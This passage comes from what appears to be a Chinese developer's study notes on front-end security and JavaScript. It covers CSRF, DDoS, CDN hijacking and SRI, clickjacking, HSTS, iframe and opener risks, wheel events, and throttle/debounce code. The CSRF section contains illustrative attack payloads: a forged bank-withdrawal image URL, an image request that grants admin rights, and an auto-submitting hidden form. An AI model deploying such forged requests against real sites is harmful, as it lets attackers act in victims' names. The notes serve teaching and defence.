src=”[http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory](https://link.zhihu.com/?target=http%3A//bank.example/withdraw%3Faccount%3Dbob%26amount%3D1000000%26for%3DMallory) ”，**并且通过广告等诱使 Bob 来访问他的网站。**当 Bob 访问该网站时，**上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器**。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，**如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，**钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。\n\n> 与 XSS 不同，CSRF 不会往页面注入恶意脚本，因此黑客是无法通过 CSRF 攻击来获取用户页面数据的；其最关键的一点是要能找到服务器的漏洞，所以对于 CSRF 我们主要的防护手段是提升服务器的安全性\n\n\n\n#### 2.3 产生的方式\n\n1. **GET 请求**\n\n   ~~~html\n   <img src=\"http://a.com/user/grant_super_user/121\" />\n   ~~~\n\n   > 攻击者 121 想将自己的身份添加为网站管理员，然后他发了一个网站会加载的图片到帖子上，其地址为上述 图片地址 ，请求到了后台数据\n\n2. **POST 请求**\n\n   ~~~html\n   <script>\n   $(function() {\n       $('#CSRF_forCSRFm').trigger('submit');\n   });\n   </script>\n   <form action=\"http://a.com/user/grant_super_user\" id=\"CSRF_form\" method=\"post\">\n       <input name=\"uid\" value=\"121\" type=\"hidden\">\n   </form>\n   ~~~\n\n   > 伪造一个用户打开黑客站点时能自动提交的表单发送 POST 请求\n\n3. **诱导用户点击链接**\n\n   ~~~html\n   <div>\n   \t<img src=\"...\">\n       <a herf=\"放黑客要操作的链接\"></a>\n   </div>\n   ~~~\n\n   > 诱惑用户点击黑客站点上的链接，这种方式通常出现在论坛或者恶意邮件上\n   >\n   > 一旦用户点击了这个链接，那么就会被黑客利用他的账户做一些没有被本人授权的事情\n\n**利用服务器的漏洞和用户的登录状态来实施攻击**\n\n\n\n#### 2.4 如何防止 CSRF 攻击\n\n##### 2.4.1 利用 Cookie 的 SameSite 属性\n\n黑客会**利用用户的登录状态**来发起 CSRF 攻击，而 Cookie 正是浏览器和服务器之间维护登录状态的一个关键数据。\n\n通常 CSRF 攻击都是从第三方站点发起的，要防止 CSRF 攻击，最好能实现**从第三方站点发送请求时禁止 Cookie 的发送**，因此在浏览器通过不同来源发送 http 请求时，有如下区别：\n\n+ 如果是从第三方站点发起的请求，那么需要浏览器禁止发送某些关键 Cookie 数据到服务器\n+ 如果是同一个站点发起的请求，那么就需要保证 Cookie 数据正常发送\n\n\n\nSameSite 属性正是为了解决这个问题的，通过使用 SameSite 可以有效降低 CSRF 攻击的风险。\n\n做法：在 HTTP 响应头，通过 set-cookie 字段设置 Cookie 时，可以带上 SameSite 选项。\n\nSameSite 的值：\n\n+ **Strict**：浏览器会完全禁止第三方Cookie；\n+ **Lax**：跨站点的情况下，从第三方站点的链接打开和从第三方站点提交 Get 方式的表单这两种方式都会携带 Cookie。但如果使用 Post 方法，或通过 img、iframe 等标签加载的 URL，都不会携带 Cookie。\n+ **None**：在任何请求的会发送 Cookie 数据\n\n\n\n##### 2.4.2 同源检测\n\n服务器验证请求的来源站点。在 HTTP 协议中，每一个异步请求都会携带上两个 Header，用户标记来源域名：\n\n+ **Origin**：通过 XMLHttpRequest、Fecth 发起跨站请求或通过 Post 方法发送请求时，都会带上 Origin 属性\n\n  > 只包含域名信息\n  >\n  > 且再两种情况下不会存在： IE11同源策略、302重定向\n\n+ **Referer**：记录了该 HTTP 请求的来源地址\n\n  > if 从 极客时间的官网打开 InfoQ 的站点，那么 Referer 为 极客时间**详细的 url**\n\n所以服务器的策略是优先判断 Origin，if 无 Origin，再根据实际情况判断是否使用 referer.\n\n\n\n##### 2.4.3 CSRF Token\n\nCSRF 中 攻击者无法直接窃取到用户的信息— cookie、header、网站内容等，仅仅是毛用 cookie 的信息。\n\n而 CSRF 成功的原因是，**服务器误把攻击者发送的请求当成用户自己的请求**。所以可以要求所有的**用户请求都携带一个 CSRF 无法获取到的 Token**。服务器通过校验请求是否携带正确的 Token，来把正常的请求和攻击的请求区分开。\n\n+ 浏览器向服务器发送请求时，服务器生成一个 CSRF Token，然后将该字符串植入到返回的页面中\n+ 浏览器若要发起什么请求时，需要带上页面的 CSRF token，服务器会验证其是否合法。若时第三方站点发出的请求，就无法获取到 CSRF token，所以即使发出了请求，服务器也会拒绝。\n\n\n\n### 3. DDos 攻击 — 分布式拒绝服务攻击\n\n#### 3.1 简介\n\n其前身：**DoS( Denial of Service )攻击，拒绝服务攻击**，这种攻击行为使网站服务器充斥大量的要求回复的信息，消耗网络带宽或系统资源，导致网络或系统不胜负荷而停止提供正常的网络服务。\n\n**DDOS ( Distributed Denial of Service ) 分布式拒绝服务攻击**，主要利用网络上现有的机器及系统的漏洞，攻占大量联网主机，使其成为攻击者的代理。当被控制的机器达到一定数量后，攻击者通过发送指令操纵这些攻击机同时向目标主机或网络发起 DoS 攻击，大量消耗其网络带宽和系统资源，导致该网络或系统瘫痪或停止提供正常的网络服务。\n\n\n\n#### 3.2 原理\n\n一个比较完善的 DDoS 攻击体系分为：**攻击者（ attacker / master ）、控制傀儡机（ demon / agent ）、受害者（ victim ）。**\n\n> 第2和第3部分，分别用做控制和实际发起攻击。第2部分的控制机只发布令而不参与实际的攻击，第3部分攻击傀儡机上发出DDoS的实际攻击包。\n>\n> 对第2和第3部分计算机，攻击者有控制权或者是部分的控制权，并把相应的DDoS程序上传到这些平台上，这些程序与正常的程序一样运行并等待来自攻击者的指令，通常它还会利用各种手段隐藏自己不被别人发现。\n>\n> 在平时，这些傀儡机器并没有什么异常，只是一旦攻击者连接到它们进行控制，并发出指令的时候，攻击愧儡机就成为攻击者去发起攻击了。\n\n之所以采用这样的结构，一个重要的目的是隔离网络联系，保护攻击者，使其不会在攻击进行时受到监控系统的跟踪。同时也能够更好地协调进攻，因为攻击执行器的数目太多，同时由一个系统发布命令会造成控制系统的网络阻塞，影响攻击的突然性和协同性。\n\n其过程为：\n\n1. 扫描大量主机以寻找可入侵主机目标\n2. 有安全漏洞的主机并获取控制器\n3. 入侵主机中安装攻击程序\n4. 用已入侵主机继续进行扫描和入侵\n\n5. 当受控制的攻击代理机达到攻击者满意的数量时。攻击者就可以通过攻击主控机随时发出击指令，一旦命令传送到攻击操纵机，主控机就可以关闭或脱离网络，以逃避追踪。\n\n6. 攻击操纵机将命令发布到攻击代理机，其接收到后，就开始向目标主机发出大量的服务请求数据包。\n\n   > 这些数据包经过伪装，使被攻击者无法识别它的来源面且，这些包所请求的服务往往要消耗较大的系统资源，如CP或网络带宽。如果数百台甚至上千台攻击代理机同时攻击一个目标，就会导致**目标主机网络和系统资源的耗尽，从而停止服务。有时，甚至会导致系统崩溃。**\n\n\n\n这样还可以阻塞目标网络的防火墙和路由器等网络设备，进一步加重网络拥塞状况。于是，目标主机根本无法为用户提供任何服务。攻击者所用的协议都是一些非常常见的协议和服务。这样，系统管理员就难于区分恶意请求和正连接请求，从而无法有效分离出攻击数据包\n\n\n\n#### 3.3 表现形式\n\n主要目的是让指定目标无注提供正常服务，甚至从互联网上消失\n\n表现形式：\n\n1. **流量攻击**：主要是针对网络带宽的攻击，即大量攻击包导致网络带宽被阻塞，合法网络包被虚假的攻击包淹没而无法到达主机\n\n2. **资源耗尽攻击**：主要是针对服务器主机的政击，即通过大量攻击包导致主机的内存被耗尽或CPU内核及应用程序占完而造成无法提供网络服务\n\n\n\n#### 3.4 识别\n\n1.  Ping测试\n2.  Telnet测试\n\n\n\n#### 3.5 攻击方式\n\n1. SYN/ACK Flood攻击\n2. TCP全连接攻击\n3. TCP刷 Script脚本攻击\n\n\n\n#### 3.6 防护策略\n\n1.  采用高性能的网络设备\n2. 尽量避免NAT的使用\n3. 充足的网络带宽保证\n4. 升级主机服务器硬件\n5. 把网站做成静态页面\n\n\n\n### 4. 点击劫持 \n\n### 5. CDN 劫持\n\n#### 5.1 简介\n\n[CDN（Content Delivery Network）内容分发网络](./08 cdn.md)\n\nCDN 劫持：CDN 资源存在于第三方服务器，在安全性上并不完全可控。CDN 劫持是一种非常难以定位的问题，首先劫持者会利用某种算法或者随机的方式进行劫持，所以非常难以复现，很多用户出现后刷新页面就不再出现了。\n\n**开启 SRI 能有效保证页面引用资源的完整性，避免恶意代码执行。**\n\n\n\n#### 5.2 SRI 简介\n\nSRI（Subresource Integrity）子资源完整性，指浏览器通过验证资源的完整性（通常从 CDN 获取）来判断其是否被篡改的安全特性。\n\n通过给 link / script 标签添加 integrity 属性可开启 SRI 功能，\n\neg：\n\n~~~html\n<script type=\"text/javascript\" src=\"//s.url.cn/xxxx/aaa.js\" \n    integrity=\"sha256-xxx sha384-yyy\"\n    crossorigin=\"anonymous\"></script>\n~~~\n\n> integrity 值分成两个部分，第一部分指定哈希值的生成算法（sha256、sha384 及 sha512），第二部分是经过 base64 编码的实际哈希值，两者之间通过一个短横（-）分割。integrity 值可以包含多个由空格分隔的哈希值，只要文件匹配其中任意一个哈希值，就可以通过校验并加载该资源。上述例子中使用了 sha256 和 sha384 两种 hash 方案。\n>\n> `crossorigin=\"anonymous\"` 的作用是引入跨域脚本，在 HTML5 中有一种方式可以获取到跨域脚本的错误信息，首先跨域脚本的服务器必须通过 Access-Controll-Allow-Origin 头信息允许当前域名可以获取错误信息，然后是当前域名的 script 标签也必须声明支持跨域，也就是 crossorigin 属性。link、img 等标签均支持跨域脚本。如果上述两个条件无法满足的话， 可以使用 `try catch` 方案。\n\n\n\n#### 5.3 浏览器处理 SRI\n\n+ 当浏览器在 script 或者 link 标签中遇到 integrity 属性之后，会在执行脚本或者应用样式表之前**对比所加载文件的哈希值和期望的哈希值**。\n\n+ 当脚本或者样式表的哈希值和期望的不一致时，浏览器必须**拒绝执行**脚本或者应用样式表，并且必须返回一个网络错误说明获得脚本或样式表失败。\n\n\n\n**Q：那么当 script 或者 link 资源 SRI 校验失败的时候应该怎么做？**\n\nA：通过 script 的 onerror 事件，当遇到 onerror 的时候重新 load 静态文件服务器之间的资源\n\n~~~js\n<script type=\"text/javascript\" src=\"//11.url.cn/aaa.js\"\n        integrity=\"sha256-xxx sha384-yyy\"\n        crossorigin=\"anonymous\"\n        onerror=\"loadScriptError.call(this, event)\"\n        onsuccess=\"loadScriptSuccess\"></script>\n~~~\n\n\n\n**Q：如何判断发送 CDN 劫持**\n\nA：再请求一次数据，比较两次得到文件的内容（当然不必全部比较），如果内容不一致，就可以得出结论了。\n\n> 可以只比较前1000字符，CDN 劫持者会在 js 文件最前面注入一些代码来达到他们的目的，注入中间代码需要 AST 解析，成本较高，所以比较全部字符串没有意义。\n\n\n\n### 6. ClickJacking — 点击劫持\n\n#### 6.1 简介\n\n点击劫持 ( ClickJacking ) / UI-覆盖攻击（UI redress attack），是一种视觉上的欺骗手段。\n\n> 通过覆盖不可见的框架误导受害者点击,虽然受害者点击的是他所看到的网页，但其实他所点击的是被黑客精心构建的另一个置于原网页上面的透明页面。这种攻击利用了HTML中<iframe>标签的透明属性。\n\n一般有两种方式：\n\n1. 攻击者使用一个透明的 iframe，覆盖在一个网页上，然后诱使用户在该页面上进行操作，此时用户在不知情的情况下点击透明的iframe页面；\n2. 攻击者使用一张图片覆盖在网页，遮挡网页原有的位置含义\n\n\n\n#### 6.2 原理\n\n攻击者在点击劫持漏洞利用实现过程中使用 iframe 作为目标网页载体。iframe 是 HTML 标准中的一个标签，可以创建包含另外一个页面的内联框架，在点击劫持漏洞利用中主要用来载入目标网页。\n\n\n\n#### 6.3 防御\n\n##### 6.3.1 服务器防御\n\n1. **X-FRAME-OPTIONS 机制**\n\n   微软提出的一个请求头，专门用来防御 iframe 嵌套的点击劫持攻击，其值有：\n\n   ~~~js\n   DENY // 拒绝任何域加载\n   SAMEORIGIN // 允许同源域下加载\n   ALLOW-FROM // 可以定义允许frame加载的页面地址\n   ~~~\n\n2. **使用 FrameBusting 代码**\n\n   ​\t\tWeb安全研究人员针对 iframe 特性提出 Frame Busting 代码，使用 JavaScript 脚本阻止恶意网站载入网页。如果检测到网页被非法网页载入，就执行自动跳转功能。\n\n   >   \tFrame Busting代码是一种有效防御网站被攻击者恶意载入的方法，网站开发人员使用Frame Busting代码阻止页面被非法载入。需要指出的情况是，如果用户浏览器禁用JavaScript脚本，那么FrameBusting代码也无法正常运行。所以，该类代码只能提供部分保障功能。\n\n   > 具体代码在第八点，iframe\n\n3. **使用认证码认证用户**\n\n   > 点击劫持漏洞通过伪造网站界面进行攻击，网站开发人员可以通过认证码识别用户，确定是用户发出的点击命令才执行相应操作。识别用户的方法中最有效的方法是认证码认证。例如，在网站上广泛存在的发帖认证码，要求用户输入图形中的字符，输入某些图形的特征等。\n\n\n\n##### 6.3.2 客户端防御\n\n由于点击劫持攻击的代码在客户端执行，因此客户端有很多机制可以防御此漏洞。\n\n1. **升级浏览器**\n    最新版本的浏览器提供很多防御点击劫持漏洞的安全机制，对于普通的互联网用户，经常更新修复浏览器的安全漏洞，能够最有效的防止恶意攻击。\n2. **NoScript 扩展**\n    对于Firefox的用户，使用 NoScript 扩展能够在一定程度上检测和阻止点击劫持攻击。利用 NoScript 中 ClearClick 组件能够检测和警告潜在的点击劫持攻击，自动检测页面中可能不安全的页面。\n\n\n\n### 7. HSTS — HTTP严格传输安全\n\n#### 7.1 场景介绍\n\n有很多网站只通过 HTTPS 对外提供服务，但用户在访问某个网站的时候，只输入 baidu.com 或者 www.baidu.com 就会302重定向到 https…。这就存在安全风险，当第一次通过 http 或域名进行访问时，302重定向可能会被劫持，篡改成一个恶意网站。（左边是正常访问流程，右边是被劫持的）\n\n<img src=\"https://pic1.zhimg.com/v2-d1188ce4a87a3f4f743b6661a4745aa0_r.jpg\" alt=\"preview\" style=\"zoom:70%;float:left\" /><img src=\"https://pic3.zhimg.com/80/v2-73c0c5babeb7991c998ee9c1a9dddcfe_720w.jpg\" alt=\"img\" style=\"zoom:70%;float:left\" />\n\n\n\n> 正常流程：浏览器向网站发起一次 HTTP 请求，在得到一个重定向响应后，发起一次 HTTPS 请求并得到最终的响应。在用户眼里：在浏览器直接输入域名可以用 https 协议和网站进行安全通信\n>\n> 被劫持流程：浏览器发起一次明文 HTTP 请求，但实际上会被攻击者拦截，攻击者作为代理，把当前请求转发给恶意网站，恶意网站返回假的网页内容，攻击者把假的网页内容返回给浏览器。\n\n\n\n#### 7.2 解决方式 HSTS\n\n解决思路：避免出现一开始有可能会被劫持的 HTTP 的明文请求和重定向。\n\n当用户让浏览器发起 HTTP 请求时，浏览器将其转换为 HTTPS 请求，略和过 HTTP 请求和重定向。\n\n<img src=\"https://pic2.zhimg.com/80/v2-06b98237cb541f4d60c697bb429dcbd5_720w.jpg\" alt=\"img\" style=\"zoom:70%;float:left\" />\n\n解决方式：用户在浏览器输入网站域名，**浏览器得知该域名要使用 HTTPS 进行通信**，浏览器直接向网站发起 HTTPS 请求，网站返回相应内容。\n\n\n\n#### 7.3 浏览器怎么知道哪个网站应该发 HTTPS 请求？\n\nHSTS（HTTP Strict Transport Security）HTTP严格传输安全，是一个 Web 安全策略机制。\n\n其核心是一个 HTTP 响应头，其可以让浏览器知道，在接下来的一段时间内，当前域名只能通过 HTTPS 进行访问，并且在浏览器发现当前连接不安全的情况下，强制拒绝用户的后续访问要求。\n\n##### 7.3.1 语法\n\n~~~js\nStrict-Transport-Security: <max-age=>[; includeSubDomains][; preload]\n~~~\n\n- max-age是必选参数，是一个以秒为单位的数值，它代表着HSTS Header的过期时间，通常设置为1年，即31536000秒。\n- includeSubDomains是可选参数，如果包含它，则意味着当前域名及其子域名均开启HSTS保护。\n- preload是可选参数，只有当你申请将自己的域名加入到浏览器内置列表的时候才需要使用到它。关于浏览器内置列表，下文有详细介绍。\n\n> 在有效期内，都强制发起 HTTPS 请求\n\n\n\n### 8. iframe\n\n##### 8.1 如何让自己的网站不被其他网站的iframe引用？\n\n~~~js\n// 检测当前网站是否被第三方iframe引用\n// 若相等证明没有被第三方引用，若不等证明被第三方引用。当发现被引用时强制跳转百度。\nif(top.location != self.location){\n    top.location.href = 'http://www.baidu.com'\n}\n~~~\n\n##### 8.2 如何禁用 被使用的 iframe 对当前网站的某些操作？\n\n**sandbox** 是html5的新属性，主要是提高iframe安全系数。iframe因安全问题而臭名昭著，这主要是因为iframe常被用于嵌入到第三方中，然后执行某些恶意操作。\n现在有一场景：我的网站需要 iframe 引用某网站，但是不想被该网站操作DOM、不想加载某些js（广告、弹框等）、当前窗口被强行跳转链接等，我们可以设置 sandbox 属性。如使用多项用空格分隔。\n\n- allow-same-origin：允许被视为同源，即可操作父级DOM或cookie等\n- allow-top-navigation：允许当前iframe的引用网页通过url跳转链接或加载\n- allow-forms：允许表单提交\n- allow-scripts：允许执行脚本文件\n- allow-popups：允许浏览器打开新窗口进行跳转\n- “”：设置为空时上面所有允许全部禁止\n\n\n\n### 9. opener\n\n如果在项目中需要 **打开新标签** 进行跳转一般会有两种方式：\n\n1) HTML -> `<a target='_blank' href='http://www.baidu.com'>`\n2)  JS  -> `window.open('http://www.baidu.com')`\n\n> 这两种方式看起来没有问题，但是存在漏洞。\n> \t\t通过这两种方式打开的页面可以**使用 window.opener 来访问源页面的 window 对象**。\n> \t\t场景：A 页面通过 <a> 或 window.open 方式，打开 B 页面。但是 B 页面存在恶意代码如下：\t\n>\n> `window.opener.location.replace('https://www.baidu.com') `【此代码仅针对打开新标签有效】\n>\n> 此时，用户正在浏览新标签页，但是原来网站的标签页已经被导航到了百度页面。恶意网站可以伪造一个足以欺骗用户的页面，使得进行恶意破坏。\n> \t\t即使在跨域状态下 opener 仍可以调用 location.replace 方法\n\n##### 9.1 `<a traget='_blank' href=''>`\n\n~~~js\n<a target=\"_blank\" href=\"\" rel=\"noopener noreferrer nofollow\">a标签跳转url</a>\n\n<!-- \n  通过 rel 属性进行控制：\n  noopener：会将 window.opener 置空，从而源标签页不会进行跳转（存在浏览器兼容问题）\n  noreferrer：兼容老浏览器/火狐。禁用HTTP头部Referer属性（后端方式）。\n  nofollow：SEO权重优化，详情见 https://blog.csdn.net/qq_33981438/article/details/80909881\n -->\n~~~\n\n##### 9.2 window.open()\n\n~~~js\n<button onclick='openurl(\"http://www.baidu.com\")'>click跳转</button>\n\nfunction openurl(url) {\n    var newTab = window.open();\n    newTab.opener = null;\n    newTab.location = url;\n}\n~~~\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["前端安全"],"categories":["furtherNotes"]},{"title":"滚轮事件","url":"/furtherNotes/further/04 滚轮事件","content":"\n> 参考链接：\n> \n> https://developer.mozilla.org/zh-CN/docs/Web/API/WheelEvent\n>\n> https://juejin.cn/post/6974018969690734628\n>\n> https://blog.csdn.net/TXW6666/article/details/106456045\n>\n> https://blog.csdn.net/lijingshan34/article/details/88350456\n\n\n## 滚轮事件 wheelEvent\n\n### 1. 介绍滚轮事件\n\nwheelEvent 接口表示用户滚动鼠标滚轮 或 类似输入设备时触发的事件。\n\n+  **该事件为标准规定的滚轮事件接口。**早期的浏览器实现过[`MouseWheelEvent`](https://developer.mozilla.org/zh-CN/docs/conflicting/Web/API/WheelEvent)和[`MouseScrollEvent`](https://developer.mozilla.org/zh-CN/docs/Web/API/MouseScrollEvent)两种滚轮事件接口，但这两种接口皆非标准，加之各浏览器间对其兼容性极差。\n\n  > onmousewheel（firefox不支持）  DOMMouseScroll（只有firefox支持）\n  >\n  > 因而开发者应使用该标准事件接口取代这两个非标准接口。\n\n+ **不要混淆 `wheel` 事件和 `scroll` 事件：**`wheel` 事件的默认动作取决于浏览器实现。\n\n  因此 `wheel` 事件不一定会触发 `scroll (en-US)` 事件。即便滚轮事件引发了文档内容的滚动行为，也不表示 `wheel` 事件中的 `delta*` 值恰好反映文档内容的滚动方向。因此，不要依赖 `delta*` 属性获知文档内容的滚动方向。可在文档内容滚动事件（`scroll`）中监视target的[`scrollLeft`](https://developer.mozilla.org/zh-CN/docs/Web/API/Element/scrollLeft)和[`scrollTop`](https://developer.mozilla.org/zh-CN/docs/Web/API/Element/scrollTop)的变化以推断滚动方向。\n\n  \n\n### 2. wheel 的事件对象的属性\n\n#### 2.1 触发事件\n\n~~~js\n(function(){\n    document.addEventListener('wheel',(e){\n    \tconsole.log(e)                          \n    })\n})()\n~~~\n\n\n\n#### 2.2 <font color=\"red\">事件对象对比</font>\n\n在谷歌(左)和火狐打印的结果为：\n\n+ **鼠标滚轮事件对象**\n\n  1. **页面往下( 滚轮往下滚)**  \n\n     <img src='./img/wheel down1.png' style=\"zoom:67%;float:left\" >\n\n     <img src='./img/wheel down2.jpg' style=\"zoom:70%;float:left\" >\n\n  2. **页面往上( 滚轮往下滚 )**\n\n     <img src='./img/wheel up1.jpg' style=\"zoom:70%;float:left\" >\n\n     <img src='./img/wheel up2.jpg' style=\"zoom:70%;float:left\" >\n\n  \n\n+ **触摸板滑动事件对象**\n\n  1. **页面往下( 触摸板向上滑动 )**\n\n     <img src=\"./img/chumoban_down1.jpg\" style=\"zoom:70%; float:left;\" >\n\n     <img src=\"./img/chumoban_down2.jpg\" style=\"zoom:70%; float:left\" >\n\n  2. **页面往上( 触摸板往下滑动 )**\n\n     <img src=\"./img/chumoban_up1.jpg\" style=\"zoom:70%; float:left;\" >\n\n     <img src=\"./img/chumoban_up2.jpg\" style=\"zoom:70%; float:left;\" >\n\n\n总结：**deltalY**：页面向下：> 0 ；页面向上：< 0；\n\n​           **wheelDelta | wheelDeltaY**：向下 : < 0；向上：>0\n\n\n\n~~~js\nwindow.addEventListener(\"wheel\", function (e) {\n    let evt = e || window.event;   //后面为了兼容 ie\n    evt.preventDefault();          //阻止浏览器默认行为u\n    if (evt.deltaY > 0 || evt.wheelDelta < 0) { ... } \n    else if (evt.deltaY < 0 || evt.wheelDelta > 0) { ... }\n  },{ passive:false });\n~~~\n\n\n\n### 3. passive: false\n\n**!`{ passive:false }`要加上**，不然滚轮滚动页面的时候会报：`Unable to preventDefault inside passive event listener`\n\n**原因：**Chorme56+开始为了让页面滚动变得更为流畅，在 window、document 和 body 上注册的 touchstart和 touchmove 事件处理函数，会默认为是 passive: true。\n\n> 之前：当浏览器首先对默认的事件进行响应的时候，要检查一下是否进行了默认事件的取消。这样就在响应滑动操作之前有那么一丝丝的耽误时间。\n>\n> 现在：google就决定默认取消了对这个事件的检查，默认时间就取消了。直接执行滑动操作。这样就更加的顺滑了。\n\n浏览器忽略默认事件的preventDefault(), 要是手动阻止会弹出一个警告, 告诉你阻止不了!!!\n\n**解决：**\n\n1. `window.addEventListener('touchmove', func, { passive: false })`\n\n2. `* { touch-action:none; }`\n\n   > touch-action是css中的一个属性，用于设置触摸屏用户如何操纵元素的区域（例如浏览器内置的缩放功能）\n\n\n\n###  4. 项目不足\n\n在项目实现的时候，没办法兼容触摸板滑动，因为触摸板每次滑动的时候会触发多次滚轮事件，就会使得页面从第一个板块滑倒页面底部。\n\n解决方案：节流防抖？\n\n**A：**\n\n1. 节流，页面会有一点延迟，不太友好\n\n2. 防抖，鼠标滚动事件不会多次触发，还是处理得蛮好的，但是触摸板事件没办法像滚轮事件那样使用，好像并没有阻止到默认事件。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["js"],"categories":["furtherNotes"]},{"title":"节流throttle、防抖debounce","url":"/furtherNotes/further/05 节流防抖","content":"\n> 参考链接：\n>\n> https://www.jianshu.com/p/566c66aafa22\n>\n> https://juejin.cn/post/6959161295358656520\n\n\n### 1. 概念\n\n#### 1.1 应用场景\n\n高频触发事件时，可能会频繁执行DOM操作，资源加载等，导致UI停顿甚至浏览器崩溃。\n\n- window对象频繁的 `onresize`，`onscroll`等事件\n- 拖拽的 mousemove 事件\n- 射击游戏的 mousedown，keydown 事件\n- 文字输入，自动完成的 keyup 事件\n\n#### 1.2 解决方案\n\n对于 window 和 resize 事件，实际需求大多为停止改变大于 n 毫秒后执行后续处理；而其他事件大多数的需求是以一定的频率执行后续处理。\n\n>  针对这两种需求出现了 debounce 和 throttle 两种方式\n\n\n\n#### 1.3 节流\n\n高频事件触发，**但在 n 秒<font color='red'>内</font>只会执行一次**，所以节流会稀释函数的执行频率\n\n> 比如mouseover，resize这种事件，每当有变化的时候，就会触发一次函数，这样很浪费资源。就比如一个持续流水的水龙头，水龙头开到最大的时候很浪费水资源，将水龙头开得小一点，让他每隔200毫秒流出一滴水，这样能源源不断的流出水而又不浪费。\n>\n> 常见例子：即时查询、不断点击、监听滚动事件触底事件\n\n\n\n#### 1.4 防抖\n\n**触发高频事件<font color='red'>后 </font>n 秒内函数只会执行一次**，如果n秒内高频事件再次被触发，则重新计算时间\n\n> A和B说话，A一直bbbbbb，当A持续说了一段时间的话后停止讲话，过了10秒之后，我们判定A讲完了，B开始回答A的话；如果10秒内A又继续讲话，那么我们判定A没讲完，B不响应，等A再次停止后，我们再次计算停止的时间，如果超过10秒B响应，如果没有则B不响应。\n>\n> 常见例子：点击按钮、拍照、下拉触底加载下一页等、search 搜索联想、window 触发 resize\n\n\n\n#### 1.5 防抖和节流的区别\n\n+ 函数防抖和函数节流都是防止某一时间内频繁触发。\n+ 函数防抖是在指定时间只执行一次，而函数节流是每到指定间隔时间执行一次。\n+ 函数防抖是将几次操作合并为一次操作进行，函数节流使得一定时间内只触发一次函数。\n\n\n\n### 2. 实现\n\n~~~html\n<body>\n  <div> 无处理输入:<input type=\"text\" class=\"non\"></div>\n  <div> 立即防抖处理输入:<input type=\"text\" class=\"imdebounce\"></div>\n  <div> 非立即防抖处理输入:<input type=\"text\" class=\"unimdebounce\"></div>\n  <div> 整合防抖处理输入:<input type=\"text\" class=\"bothdebounce\"></div>\n  <div> 时间戳节流处理输入:<input type=\"text\" class=\"stampthrottle\"></div>\n  <div> 定时器节流处理输入:<input type=\"text\" class=\"timeoutthrottle\"></div>\n</body>\n<script>\n  function pri(obj) {\n    console.log(obj.value + \" \" + new Date());\n  }\n  const non = document.querySelector('.non');\n  non.addEventListener('keyup', e => {\n    pri(e.target)\n  })\n   ...\n</script>\n~~~\n\n\n\n#### 2.1 节流\n\n> 使得一定时间内只触发一次函数。原理是通过判断是否有延迟调用函数未执行。\n\n+ **定时器：** 函数触发是在时间段内结束的时候\n+ **时间戳：** 函数触发是在时间段内开始的时候\n\n##### 2.1.1 定时器节流\n\n~~~js\n const timenode = document.querySelector('.timeoutthrottle');\n  // 定时器\n  function timethrottle(func, delay) {\n    let canrun;\n    return function (arguments) {\n      if (!canrun) {\n        canrun = setTimeout(() => {\n          func.call(this, arguments)\n          canrun = null;\n        }, delay)\n      }\n    }\n  }\n\n  const time = timethrottle(pri, 500);\n  timenode.addEventListener('keyup', e => {\n    time(e.target)\n  })\n~~~\n\n\n\n##### 2.1.2 时间戳节流\n\n~~~js\n  const stampnode = document.querySelector('.stampthrottle');\n  // 时间戳\n  function stampthrottle(func, delay) {\n    let pre = 0;    //上一次记录时间\n    return function (arguments) {\n      let now = new Date();\n      if (now - pre >= delay) {\n        func.call(this, arguments); //当前时间 - 上次时间 > 延时时间\n        pre = now;\n      }\n    }\n  }\n\n  const stamp = stampthrottle(pri, 500);\n  stampnode.addEventListener('keyup', e => {\n    stamp(e.target)\n  })\n~~~\n\n\n\n#### 2.2 防抖\n\n> 将多次操作合并为一次操作进行。原理是维护一个计时器，规定在delay时间后触发函数，但是在delay时间内再次触发的话，就会取消之前的计时器而重新设置。\n\n+ **非立即防抖：**指的是触发事件后函数不会立即执行，而是在 n 秒后执行，如果在 n 秒内又触发了事件，则会重新计算函数执行时间。\n\n+ **立即防抖：** 指的是触发事件后函数会立即执行，然后 n 秒内不触发事件才能继续执行函数的效果。\n\n  简而言之，立即执行版就是第一次事件触发后会立即执行，至少执行一次事件。\n\n##### 2.2.1 立即防抖\n\n~~~js\n  const imnode = document.querySelector('.imdebounce');\n  // 立即防抖\n  // 指的是触发事件后函数会立即执行，n 秒内不触发事件才能继续执行函数的效果\n  function imdebounce(func, delay) {\n    let timeout;\n    return function (arguments) {\n\n      if (timeout) {\n        clearTimeout(timeout);\n      }\n      let flag = !timeout;\n      timeout = setTimeout(function () {\n        // func.call(this, arguments);\n        timeout = null;\n      }, delay)\n      if (flag) {\n        func.call(this, arguments)\n      }\n    }\n  }\n  const im = imdebounce(pri, 500);\n  imnode.addEventListener('keyup', e => {\n    // ; debugger\n    // imdebounce(pri, 500)(e.target)   //就不可以为什么\n    \n    im(e.target);\n  })\n~~~\n\n\n\n##### 2.2.2 非立即防抖\n\n~~~js\n  const unimnode = document.querySelector('.unimdebounce');\n  // 非立即防抖\n  // 高频触发时 如果 触发后 delay 没有再触发 就执行函数\n  function unimdebounce(func, delay) {\n    let timeout;\n    return function (arguments) {\n      if (timeout) {\n        clearTimeout(timeout);\n      }\n      timeout = setTimeout(() => {\n        func.call(this, arguments);\n        timeout = null;\n      }, delay)\n    }\n  }\n  const un = unimdebounce(pri, 500);\n  unimnode.addEventListener('keyup', e => {\n    un(e.target)\n  })\n~~~\n\n\n\n##### 2.2.3 结合版\n\n~~~js\n\n  const bothnode = document.querySelector('.bothdebounce');\n  // 结合版\n  function debounce(func, delay = 500, immediate = true) {\n    let timeout;\n    return function (arguments) {\n      if (timeout) {\n        clearTimeout(timeout);\n      }\n      if (immediate) {\n        // 立即执行\n        let flag = !timeout;\n        timeout = setTimeout(() => {\n          timeout = null;\n        }, delay)\n        if (flag) {\n          